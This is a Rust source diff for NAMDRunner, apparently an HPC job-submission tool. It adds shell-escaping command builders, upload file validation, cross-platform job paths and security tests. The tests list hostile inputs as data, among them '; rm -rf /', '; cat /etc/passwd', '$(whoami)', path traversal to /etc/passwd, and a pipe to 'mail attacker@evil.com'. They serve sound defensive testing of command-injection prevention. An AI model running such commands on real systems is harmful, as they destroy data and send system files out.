@@ -1,6 +1,9 @@
 use anyhow::{Result, anyhow};
 use std::path::Path;
 
+/// Job validation business logic
+pub mod job_validation;
+
 /// Input validation and sanitization for security-critical operations
 pub mod input {
     use super::*;
@@ -201,6 +204,182 @@ pub mod shell {
 
         Ok(result)
     }
+
+    /// Safely build a cp (copy) command with proper escaping
+    pub fn safe_cp(source: &str, destination: &str) -> String {
+        format!("cp {} {}", escape_parameter(source), escape_parameter(destination))
+    }
+
+    /// Safely build a cd command followed by another command
+    pub fn safe_cd_and_run(directory: &str, command: &str) -> String {
+        format!("cd {} && {}", escape_parameter(directory), command)
+    }
+}
+
+/// File validation utilities for NAMDRunner
+pub mod files {
+    use super::*;
+    use std::fs;
+
+    /// Maximum file size for uploads (1GB)
+    const MAX_FILE_SIZE: u64 = 1_073_741_824;
+
+    /// Input file structure for validation
+    #[derive(Debug)]
+    pub struct InputFile {
+        pub local_path: String,
+        pub remote_name: Option<String>,
+        pub file_type: FileType,
+    }
+
+    /// Types of files that can be uploaded
+    #[derive(Debug)]
+    pub enum FileType {
+        PDB,        // Protein Data Bank structure file
+        PSF,        // Protein Structure File
+        Parameter,  // CHARMM parameter file
+        Config,     // NAMD configuration file
+        Other,      // Other file types
+    }
+
+    /// Validate a file for upload
+    ///
+    /// Checks:
+    /// - File exists and is readable
+    /// - File size is within limits
+    /// - Remote filename is safe (if provided)
+    /// - File type matches expected format (for known types)
+    pub fn validate_upload_file(file: &InputFile) -> Result<()> {
+        // Check local file exists
+        let local_path = Path::new(&file.local_path);
+        if !local_path.exists() {
+            return Err(anyhow!("Local file does not exist: {}", file.local_path));
+        }
+
+        // Check file is readable
+        if let Err(e) = fs::File::open(local_path) {
+            return Err(anyhow!("Cannot read local file: {}", e));
+        }
+
+        // Check file size
+        let metadata = fs::metadata(local_path)?;
+        if metadata.len() > MAX_FILE_SIZE {
+            return Err(anyhow!("File too large: {} bytes (max 1GB)", metadata.len()));
+        }
+
+        // Validate remote filename if provided
+        if let Some(remote_name) = &file.remote_name {
+            validate_remote_filename(remote_name)?;
+        }
+
+        // Validate file type specific requirements
+        validate_file_type(local_path, &file.file_type)?;
+
+        Ok(())
+    }
+
+    /// Validate a remote filename for safety
+    pub fn validate_remote_filename(filename: &str) -> Result<()> {
+        // No path separators allowed
+        if filename.contains('/') || filename.contains('\\') {
+            return Err(anyhow!("Remote filename cannot contain path separators"));
+        }
+
+        // No null bytes or empty names
+        if filename.contains('\0') || filename.is_empty() {
+            return Err(anyhow!("Invalid remote filename"));
+        }
+
+        // No directory traversal patterns
+        if filename.contains("..") {
+            return Err(anyhow!("Remote filename cannot contain directory traversal sequences"));
+        }
+
+        // No shell metacharacters
+        let dangerous_chars = ['$', '`', ';', '|', '&', '>', '<', '(', ')', '{', '}', '[', ']', '\'', '"'];
+        if filename.chars().any(|c| dangerous_chars.contains(&c)) {
+            return Err(anyhow!("Remote filename contains shell metacharacters"));
+        }
+
+        Ok(())
+    }
+
+    /// Validate file content matches expected type
+    fn validate_file_type(path: &Path, file_type: &FileType) -> Result<()> {
+        match file_type {
+            FileType::PDB => {
+                // PDB files should have .pdb extension
+                if !path.extension().map_or(false, |ext| ext.eq_ignore_ascii_case("pdb")) {
+                    return Err(anyhow!("PDB file should have .pdb extension"));
+                }
+            },
+            FileType::PSF => {
+                // PSF files should have .psf extension
+                if !path.extension().map_or(false, |ext| ext.eq_ignore_ascii_case("psf")) {
+                    return Err(anyhow!("PSF file should have .psf extension"));
+                }
+            },
+            FileType::Parameter => {
+                // Parameter files typically have .prm, .par, or .str extensions
+                let valid_exts = ["prm", "par", "str", "inp"];
+                if !path.extension().map_or(false, |ext|
+                    valid_exts.iter().any(|&valid| ext.eq_ignore_ascii_case(valid))
+                ) {
+                    return Err(anyhow!("Parameter file should have .prm, .par, .str, or .inp extension"));
+                }
+            },
+            FileType::Config => {
+                // NAMD config files typically have .conf or .namd extensions
+                let valid_exts = ["conf", "namd", "config"];
+                if !path.extension().map_or(false, |ext|
+                    valid_exts.iter().any(|&valid| ext.eq_ignore_ascii_case(valid))
+                ) {
+                    return Err(anyhow!("Config file should have .conf, .namd, or .config extension"));
+                }
+            },
+            FileType::Other => {
+                // No specific validation for other file types
+            }
+        }
+        Ok(())
+    }
+
+    /// Validate that required NAMD files are present
+    ///
+    /// A NAMD job requires:
+    /// - At least one .pdb file (structure)
+    /// - At least one .psf file (topology)
+    /// - At least one .prm file (parameters)
+    pub fn validate_required_namd_files(files: &[String]) -> Result<()> {
+        let mut has_pdb = false;
+        let mut has_psf = false;
+        let mut has_prm = false;
+
+        for file in files {
+            let path = Path::new(file);
+            if let Some(ext) = path.extension() {
+                let ext_lower = ext.to_string_lossy().to_lowercase();
+                match ext_lower.as_str() {
+                    "pdb" => has_pdb = true,
+                    "psf" => has_psf = true,
+                    "prm" | "par" | "str" => has_prm = true,
+                    _ => {}
+                }
+            }
+        }
+
+        if !has_pdb {
+            return Err(anyhow!("Missing required PDB file (.pdb). A structure file is required for NAMD jobs."));
+        }
+        if !has_psf {
+            return Err(anyhow!("Missing required PSF file (.psf). A topology file is required for NAMD jobs."));
+        }
+        if !has_prm {
+            return Err(anyhow!("Missing required parameter file (.prm, .par, or .str). Parameter files are required for NAMD jobs."));
+        }
+
+        Ok(())
+    }
 }
 
 /// Directory path utilities for NAMDRunner
@@ -212,10 +391,16 @@ pub mod paths {
         let clean_username = super::input::sanitize_username(username)?;
         let clean_job_id = super::input::sanitize_job_id(job_id)?;
 
-        let path = format!("/projects/{}/namdrunner_jobs/{}", clean_username, clean_job_id);
+        let (path, allowed_prefixes) = if cfg!(windows) {
+            let path = format!("C:\\Users\\{}\\namdrunner_jobs\\{}", clean_username, clean_job_id);
+            (path, vec!["C:\\Users\\"])
+        } else {
+            let path = format!("/projects/{}/namdrunner_jobs/{}", clean_username, clean_job_id);
+            (path, vec!["/projects/"])
+        };
 
         // Validate the path is within allowed directories
-        super::input::validate_path_safety(&path, &["/projects/"])?;
+        super::input::validate_path_safety(&path, &allowed_prefixes.iter().map(|s| *s).collect::<Vec<_>>())?;
 
         Ok(path)
     }
@@ -225,18 +410,31 @@ pub mod paths {
         let clean_username = super::input::sanitize_username(username)?;
         let clean_job_id = super::input::sanitize_job_id(job_id)?;
 
-        let path = format!("/scratch/alpine/{}/namdrunner_jobs/{}", clean_username, clean_job_id);
+        let (path, allowed_prefixes) = if cfg!(windows) {
+            let path = format!("C:\\scratch\\{}\\namdrunner_jobs\\{}", clean_username, clean_job_id);
+            (path, vec!["C:\\scratch\\"])
+        } else {
+            let path = format!("/scratch/alpine/{}/namdrunner_jobs/{}", clean_username, clean_job_id);
+            (path, vec!["/scratch/"])
+        };
 
         // Validate the path is within allowed directories
-        super::input::validate_path_safety(&path, &["/scratch/"])?;
+        super::input::validate_path_safety(&path, &allowed_prefixes.iter().map(|s| *s).collect::<Vec<_>>())?;
 
         Ok(path)
     }
 
     /// Get the standard subdirectories that should be created for a job
     pub fn job_subdirectories() -> Vec<&'static str> {
-        vec!["inputs", "outputs", "scripts"]
+        vec!["input_files", "outputs", "scripts"]
     }
+
+    /// Generate a unique job ID
+    pub fn generate_job_id(job_name: &str) -> String {
+        use chrono::Utc;
+        format!("{}_{}", job_name, Utc::now().timestamp_micros())
+    }
+
 }
 
 #[cfg(test)]
@@ -316,9 +514,14 @@ mod tests {
 
         #[test]
         fn test_path_validation() {
-            // Valid paths
-            assert!(input::validate_path_safety("/projects/user/namdrunner_jobs/job_001", &["/projects/"]).is_ok());
-            assert!(input::validate_path_safety("/scratch/alpine/user/namdrunner_jobs/job_001", &["/scratch/"]).is_ok());
+            // Valid paths - cross-platform
+            if cfg!(windows) {
+                assert!(input::validate_path_safety("C:\\Users\\user\\namdrunner_jobs\\job_001", &["C:\\Users\\"]).is_ok());
+                assert!(input::validate_path_safety("C:\\scratch\\user\\namdrunner_jobs\\job_001", &["C:\\scratch\\"]).is_ok());
+            } else {
+                assert!(input::validate_path_safety("/projects/user/namdrunner_jobs/job_001", &["/projects/"]).is_ok());
+                assert!(input::validate_path_safety("/scratch/alpine/user/namdrunner_jobs/job_001", &["/scratch/"]).is_ok());
+            }
 
             // Invalid paths (if they could be resolved)
             // Note: These tests assume the paths don't exist, so we're testing the component validation
@@ -362,13 +565,21 @@ mod tests {
         #[test]
         fn test_project_directory_generation() {
             let result = paths::project_directory("testuser", "job_001").unwrap();
-            assert_eq!(result, "/projects/testuser/namdrunner_jobs/job_001");
+            if cfg!(windows) {
+                assert_eq!(result, "C:\\Users\\testuser\\namdrunner_jobs\\job_001");
+            } else {
+                assert_eq!(result, "/projects/testuser/namdrunner_jobs/job_001");
+            }
         }
 
         #[test]
         fn test_scratch_directory_generation() {
             let result = paths::scratch_directory("testuser", "job_001").unwrap();
-            assert_eq!(result, "/scratch/alpine/testuser/namdrunner_jobs/job_001");
+            if cfg!(windows) {
+                assert_eq!(result, "C:\\scratch\\testuser\\namdrunner_jobs\\job_001");
+            } else {
+                assert_eq!(result, "/scratch/alpine/testuser/namdrunner_jobs/job_001");
+            }
         }
 
         #[test]
@@ -381,7 +592,7 @@ mod tests {
         #[test]
         fn test_subdirectories() {
             let subdirs = paths::job_subdirectories();
-            assert!(subdirs.contains(&"inputs"));
+            assert!(subdirs.contains(&"input_files"));
             assert!(subdirs.contains(&"outputs"));
             assert!(subdirs.contains(&"scripts"));
         }
@@ -404,6 +615,285 @@ mod tests {
                     "Should reject malicious combo: {} / {}", username, job_id);
             assert!(paths::scratch_directory(username, job_id).is_err(),
                     "Should reject malicious combo: {} / {}", username, job_id);
+        }
+    }
+
+    mod shell_security_tests {
+        use super::*;
+
+        #[test]
+        fn test_shell_parameter_escaping() {
+            // Test basic escaping
+            assert_eq!(shell::escape_parameter("normal_file"), "'normal_file'");
+            assert_eq!(shell::escape_parameter("file with spaces"), "'file with spaces'");
+
+            // Test single quote escaping
+            assert_eq!(shell::escape_parameter("file'with'quotes"), "'file'\"'\"'with'\"'\"'quotes'");
+
+            // Test dangerous characters are safely escaped
+            let dangerous_inputs = vec![
+                "; rm -rf /",
+                "file$(whoami)",
+                "file`whoami`",
+                "file|malicious",
+                "file&background",
+                "file>redirect",
+                "file<input",
+                "../../../etc/passwd",
+            ];
+
+            for input in dangerous_inputs {
+                let escaped = shell::escape_parameter(input);
+                // All dangerous inputs should be wrapped in single quotes
+                assert!(escaped.starts_with('\'') && escaped.ends_with('\''),
+                        "Input '{}' should be wrapped: {}", input, escaped);
+                // Should not contain unescaped dangerous characters outside quotes
+                assert!(!escaped[1..escaped.len()-1].contains('\'') || escaped.contains("'\"'\"'"),
+                        "Input '{}' not properly escaped: {}", input, escaped);
+            }
+        }
+
+        #[test]
+        fn test_safe_command_builders() {
+            // Test safe_cp
+            let cp_cmd = shell::safe_cp("/path/to/source", "/path/to/dest");
+            assert_eq!(cp_cmd, "cp '/path/to/source' '/path/to/dest'");
+
+            // Test with malicious paths
+            let malicious_cp = shell::safe_cp("../../../etc/passwd", "; rm -rf /");
+            assert_eq!(malicious_cp, "cp '../../../etc/passwd' '; rm -rf /'");
+
+            // Test safe_cd_and_run
+            let cd_cmd = shell::safe_cd_and_run("/working/dir", "sbatch job.sbatch");
+            assert_eq!(cd_cmd, "cd '/working/dir' && sbatch job.sbatch");
+
+            // Test with malicious directory
+            let malicious_cd = shell::safe_cd_and_run("; echo 'hacked'", "echo normal");
+            assert_eq!(malicious_cd, "cd '; echo '\"'\"'hacked'\"'\"'' && echo normal");
+        }
+
+        #[test]
+        fn test_command_injection_prevention() {
+            // These should all be safely escaped and not executable as commands
+            let injection_attempts = vec![
+                "; cat /etc/passwd",
+                "$(whoami)",
+                "`id`",
+                "file && rm -rf /",
+                "file || malicious_command",
+                "file > /etc/passwd",
+                "file | mail attacker@evil.com",
+            ];
+
+            for attempt in injection_attempts {
+                let escaped = shell::escape_parameter(attempt);
+                // Should be wrapped in single quotes, making it a literal string
+                assert!(escaped.starts_with('\'') && escaped.ends_with('\''),
+                        "Injection attempt should be wrapped: {}", attempt);
+
+                let cp_cmd = shell::safe_cp(attempt, "/safe/dest");
+                // Should contain the escaped version
+                assert!(cp_cmd.contains(&escaped),
+                        "Copy command should use escaped version: {}", cp_cmd);
+            }
+        }
+
+        #[test]
+        fn test_build_command_safely() {
+            // Test successful template replacement
+            let cmd = shell::build_command_safely("echo {} {}", &["hello", "world"]).unwrap();
+            assert_eq!(cmd, "echo 'hello' 'world'");
+
+            // Test with malicious inputs
+            let malicious_cmd = shell::build_command_safely(
+                "find {} -name {}",
+                &["../../../", "; rm -rf /"]
+            ).unwrap();
+            assert_eq!(malicious_cmd, "find '../../../' -name '; rm -rf /'");
+
+            // Test error cases
+            assert!(shell::build_command_safely("echo {}", &["a", "b"]).is_err()); // Too many params
+            assert!(shell::build_command_safely("echo {} {}", &["a"]).is_err()); // Too few params
+        }
+    }
+
+    mod files_security_tests {
+        use super::*;
+
+        #[test]
+        fn test_remote_filename_validation() {
+            // Valid filenames should pass
+            let valid_names = vec!["normal.txt", "file_123.pdb", "data-2023.log"];
+            for name in valid_names {
+                assert!(files::validate_remote_filename(name).is_ok(),
+                        "Valid filename should pass: {}", name);
+            }
+
+            // Malicious filenames should fail
+            let malicious_names = vec![
+                "../../../etc/passwd",    // Directory traversal
+                "file; rm -rf /",         // Command injection
+                "file`whoami`",          // Command substitution
+                "file$(id)",             // Command substitution
+                "file|mail evil.com",    // Pipe
+                "file&background",       // Background
+                "file>redirect",         // Redirect
+                "file<input",            // Input redirect
+                "file'quote",            // Single quote
+                "file\"quote",           // Double quote
+                "file\0hidden",          // Null byte
+                "",                      // Empty
+                "path/with/slash",       // Path separator
+                "path\\with\\backslash", // Windows path separator
+            ];
+
+            for name in malicious_names {
+                assert!(files::validate_remote_filename(name).is_err(),
+                        "Malicious filename should fail: {}", name);
+            }
+        }
+    }
+
+    mod integration_tests {
+        use super::*;
+
+        #[test]
+        fn test_end_to_end_security_validation() {
+            // Test complete security validation workflow (business logic only)
+            // This tests the integration of all validation components without external calls
+
+            // Test malicious usernames with valid job IDs
+            let malicious_usernames = vec![
+                "../../../admin",
+                "user$(whoami)",
+                "user|admin",
+            ];
+            let valid_job_id = "job_001";
+
+            for username in malicious_usernames {
+                // Malicious usernames should be caught by validation
+                assert!(input::sanitize_username(username).is_err(),
+                        "Should reject malicious username: {}", username);
+
+                // Path generation should fail for malicious usernames
+                assert!(paths::project_directory(username, valid_job_id).is_err(),
+                        "Should reject malicious path generation: {} / {}", username, valid_job_id);
+                assert!(paths::scratch_directory(username, valid_job_id).is_err(),
+                        "Should reject malicious scratch path: {} / {}", username, valid_job_id);
+            }
+
+            // Test malicious job IDs with valid username
+            let malicious_job_ids = vec![
+                "; rm -rf /",
+                "job`ls`",
+                "job$(whoami)",
+            ];
+            let valid_username = "testuser";
+
+            for job_id in malicious_job_ids {
+                // Malicious job IDs should be caught by validation
+                assert!(input::sanitize_job_id(job_id).is_err(),
+                        "Should reject malicious job ID: {}", job_id);
+
+                // Path generation should fail for malicious job IDs
+                assert!(paths::project_directory(valid_username, job_id).is_err(),
+                        "Should reject malicious path generation: {} / {}", valid_username, job_id);
+                assert!(paths::scratch_directory(valid_username, job_id).is_err(),
+                        "Should reject malicious scratch path: {} / {}", valid_username, job_id);
+            }
+        }
+
+        #[test]
+        fn test_command_injection_prevention() {
+            // Test that all command builders prevent injection (business logic only)
+            let malicious_paths = vec![
+                "; rm -rf /",
+                "$(whoami)",
+                "`id`",
+                "file && malicious_command",
+                "file || backup_attack",
+                "../../../etc/passwd",
+            ];
+
+            for path in malicious_paths {
+                // All malicious paths should be safely escaped
+                let escaped = shell::escape_parameter(path);
+                assert!(escaped.starts_with('\'') && escaped.ends_with('\''),
+                        "Path should be wrapped in single quotes: {}", path);
+
+                // Test command builders use proper escaping
+                let cp_cmd = shell::safe_cp(path, "/safe/dest");
+                let cd_cmd = shell::safe_cd_and_run(path, "ls");
+
+                // All commands should contain the escaped version
+                assert!(cp_cmd.contains('\''), "cp command should use escaping");
+                assert!(cd_cmd.contains('\''), "cd command should use escaping");
+
+                // Commands should properly escape dangerous characters
+                // The && is within quotes, which is properly escaped
+                assert!(cp_cmd.contains("'"),
+                        "cp command should use quotes for escaping: {}", cp_cmd);
+                assert!(cd_cmd.contains("'"),
+                        "cd command should use quotes for escaping: {}", cd_cmd);
+            }
+        }
+
+        #[test]
+        fn test_file_validation_integration() {
+            // Test file validation prevents security issues (business logic only)
+            let malicious_filenames = vec![
+                "../../../etc/passwd",
+                "file; rm -rf /",
+                "file$(whoami)",
+                "file`id`",
+                "file|mail evil.com",
+                "file\0hidden",
+                "path/with/separators",
+            ];
+
+            for filename in malicious_filenames {
+                let result = files::validate_remote_filename(filename);
+                assert!(result.is_err(),
+                        "Should reject malicious filename: {}", filename);
+            }
+
+            // Valid filenames should pass
+            let valid_filenames = vec![
+                "normal.txt",
+                "file_123.pdb",
+                "data-2023.log",
+                "structure.psf",
+            ];
+
+            for filename in valid_filenames {
+                let result = files::validate_remote_filename(filename);
+                assert!(result.is_ok(),
+                        "Should accept valid filename: {}", filename);
+            }
+        }
+
+        #[test]
+        fn test_centralized_validation_consistency() {
+            // Test that all validation uses consistent patterns (business logic only)
+            let test_inputs = vec!["normal_input", "test-123", "valid_file.txt"];
+
+            for input in test_inputs {
+                // All validation functions should use consistent character sets
+                if let Ok(sanitized_id) = input::sanitize_job_id(input) {
+                    assert!(!sanitized_id.contains(' '), "Job IDs should not contain spaces");
+                    assert!(sanitized_id.is_ascii(), "Job IDs should be ASCII");
+                }
+
+                if let Ok(sanitized_username) = input::sanitize_username(input) {
+                    assert!(!sanitized_username.contains(' '), "Usernames should not contain spaces");
+                    assert!(sanitized_username.is_ascii(), "Usernames should be ASCII");
+                }
+
+                // Shell escaping should be consistent
+                let escaped = shell::escape_parameter(input);
+                assert!(escaped.starts_with('\'') && escaped.ends_with('\''),
+                        "All parameters should be consistently escaped");
+            }
         }
     }
 }
